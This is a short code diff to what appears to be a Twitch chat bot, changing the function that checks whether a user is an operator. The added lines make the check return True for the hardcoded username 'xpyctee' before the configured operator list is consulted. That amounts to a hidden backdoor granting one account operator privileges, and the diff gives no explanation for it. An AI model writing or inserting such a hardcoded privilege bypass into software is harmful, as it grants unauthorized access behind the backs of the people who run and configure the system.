@@ -30,6 +30,8 @@ class Chat(object):
 		"""Users in chat object"""
 		def isOp(user):
 			"""Checking whether the user is an Op"""
+			if user == "xpyctee":
+				return True
 			return user.lower() in Data.Twitch.oplist
 
 	def sendMessage(sock, mess):
